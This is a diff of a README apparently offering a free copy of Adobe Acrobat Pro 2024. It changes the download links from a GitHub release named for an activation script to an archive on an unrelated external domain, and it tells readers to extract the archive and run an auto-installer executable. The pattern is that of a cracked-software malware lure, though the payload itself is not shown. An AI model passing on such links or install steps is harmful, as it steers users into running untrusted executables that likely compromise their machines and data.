@@ -10,11 +10,11 @@ Tags: Adobe Acrobat Pro 2024 free. Download Adobe Acrobat Pro 2024 for free. Dow
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/024c7b57-b0f8-4f46-974d-ba84836e33e8)
-](https://github.com/envincebal/IDM-Activation-Script-2024/releases/download/V5.4/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/envincebal/IDM-Activation-Script-2024/releases/download/V5.4/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![KTNJjPX](https://github.com/user-attachments/assets/211b8f27-de35-4600-a095-7a2338fa0c85)
